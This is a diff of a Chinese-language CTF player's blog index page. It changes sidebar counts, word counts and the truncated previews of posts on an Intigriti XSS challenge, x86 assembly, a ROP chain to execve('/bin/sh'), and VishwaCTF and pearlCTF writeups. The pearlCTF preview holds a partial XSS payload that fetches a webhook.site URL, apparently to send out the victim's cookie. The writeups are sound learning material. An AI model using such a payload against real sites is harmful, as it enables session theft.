@@ -202,11 +202,11 @@
   </div>
   <div class="sidebar-state-category">
     <div>Categories</div>
-    <div class="sidebar-state-number">4</div>
+    <div class="sidebar-state-number">0</div>
   </div>
   <div class="sidebar-state-tag">
     <div>Tags</div>
-    <div class="sidebar-state-number">0</div>
+    <div class="sidebar-state-number">16</div>
   </div>
 </div>
 <div class="sidebar-social">
@@ -412,8 +412,8 @@ CryptoJPG^PNG&amp;#x3D;?source1234567891011121314from itertools import cycledef 
           Intigriti’s August XSS challenge
 Author:堇姬Naup
 
-題目https://challenge-0823.intigriti.io/有一個計算機可以輸入東西，只要有執行alert(document.domain)就可以過了image
-Source code12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808
+題目https://challenge-0823.intigriti.io/有一個計算機可以輸入東西，只要有執行alert(document.domain)就可以過了
+Source code1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283
         
       </article>
     </div>
@@ -437,7 +437,7 @@ Source code123456789101112131415161718192021222324252627282930313233343536373839
     <div class="post-info">
       <div class="post-meta">
         <span><span class="icon-calendar"></span>2024-04-25</span>
-        <span><span class="icon-pencil"></span>483 words</span>
+        <span><span class="icon-pencil"></span>479 words</span>
         <span><span class="icon-clock"></span>2 mins</span>
       </div>
       <h2 class="post-title">Assembly-x86</h2>
@@ -466,7 +466,6 @@ CPU暫存器隨設計而改變用途
 
 
 
-
 名稱
 意思
 
@@ -492,7 +491,6 @@ data
 
 
 
-
 名稱
 意思
 
@@ -507,7 +505,7 @@ destination index
 
 
 rbp
-base p
+base poi
         
       </article>
     </div>
@@ -531,7 +529,7 @@ base p
     <div class="post-info">
       <div class="post-meta">
         <span><span class="icon-calendar"></span>2024-04-25</span>
-        <span><span class="icon-pencil"></span>311 words</span>
+        <span><span class="icon-pencil"></span>306 words</span>
         <span><span class="icon-clock"></span>1 min</span>
       </div>
       <h2 class="post-title">ROP-chall-1</h2>
@@ -541,11 +539,10 @@ base p
 Author:堇姬
 
 題目來源ICED的pwn題目https://ctf.nicewhite.xyz/
-確認保護image看到有開Stack canary，但溢出後卻沒有報stack canary的錯誤，所以應該是沒開。另外他有開NX，所以沒辦法寫shellcodeimage
-分析ASMimage有gets 可以BOF，不過沒有其他function可以return過去，所以應該是要ROP
+確認保護看到有開Stack canary，但溢出後卻沒有報stack canary的錯誤，所以應該是沒開。另外他有開NX，所以沒辦法寫shellcode
+分析ASM有gets 可以BOF，不過沒有其他function可以return過去，所以應該是要ROP
 堆ROP
 execve(‘bin&amp;#x2F;sh’)
-
 
 
 
@@ -564,7 +561,10 @@ rdi
 
 
 rsi
-argv(
+argv(這裡&amp;#x3D;0)
+
+
+rdx
         
       </article>
     </div>
@@ -622,7 +622,7 @@ Author:堇姬
     <div class="post-info">
       <div class="post-meta">
         <span><span class="icon-calendar"></span>2024-03-30</span>
-        <span><span class="icon-pencil"></span>4.6k words</span>
+        <span><span class="icon-pencil"></span>4.5k words</span>
         <span><span class="icon-clock"></span>25 mins</span>
       </div>
       <h2 class="post-title">VishwaCTF-2024-Writeup</h2>
@@ -631,8 +631,8 @@ Author:堇姬
           VishwaCTF 2024 writeup
 Team: CakeisTheFake(單人)Rank: 31&amp;#x2F;1039Author: Naup堇姬
 
-MiscWho am I?image
-WebSave The City1234567DESCRIPTIONThe RAW Has Got An Input That ISIS Has Planted a Bomb Somewhere In The Pune! Fortunetly, RAW Has Infiltratrated The Internet Activity of One Suspect And They Found Thi
+MiscWho am I?
+WebSave The City1234567DESCRIPTIONThe RAW Has Got An Input That ISIS Has Planted a Bomb Somewhere In The Pune! Fortunetly, RAW Has Infiltratrated The Internet Activity of One Suspect And They Found This Lin
         
       </article>
     </div>
@@ -705,12 +705,12 @@ rush-p0pp3r
       <h2 class="post-title">pearlCTF-2024-WP</h2>
       <article class="post-article">
         
-          Pearl CTF 2024- CakeisTheFake - Writeupimage
+          Pearl CTF 2024- CakeisTheFake - Writeup
 
 Team : CakeisTheFakeRank : 16&amp;#x2F;605
 
-Weblearn HTTP題目是一個web service，會把使用者丟進去的get參數在後端處理後變封包丟出來：image然後有個/flag的路徑會去驗證你的cookie，是的話才可以拿到flag。標準的XSS：payload 
-123HTTP/1.1 200 OK&amp;lt;script&amp;gt;fetch(&amp;quot;http://webhook.site/c9e321c1-b9d5-4b55-9d10-f1feec26a1
+Weblearn HTTP題目是一個web service，會把使用者丟進去的get參數在後端處理後變封包丟出來：然後有個/flag的路徑會去驗證你的cookie，是的話才可以拿到flag。標準的XSS：payload 
+123HTTP/1.1 200 OK&amp;lt;script&amp;gt;fetch(&amp;quot;http://webhook.site/c9e321c1-b9d5-4b55-9d10-f1feec26a1d0?shark=&amp;
         
       </article>
     </div>
@@ -750,7 +750,7 @@ Weblearn HTTP題目是一個web service，會把使用者丟進去的get參數�
     
       <div>
         <span class="icon-brush"></span>
-        149.8k
+        149.6k
         &nbsp;|&nbsp;
         <span class="icon-coffee"></span>
         13:10
@@ -793,11 +793,11 @@ Weblearn HTTP題目是一個web service，會把使用者丟進去的get參數�
   </div>
   <div class="sidebar-state-category">
     <div>Categories</div>
-    <div class="sidebar-state-number">4</div>
+    <div class="sidebar-state-number">0</div>
   </div>
   <div class="sidebar-state-tag">
     <div>Tags</div>
-    <div class="sidebar-state-number">0</div>
+    <div class="sidebar-state-number">16</div>
   </div>
 </div>
 <div class="sidebar-social">
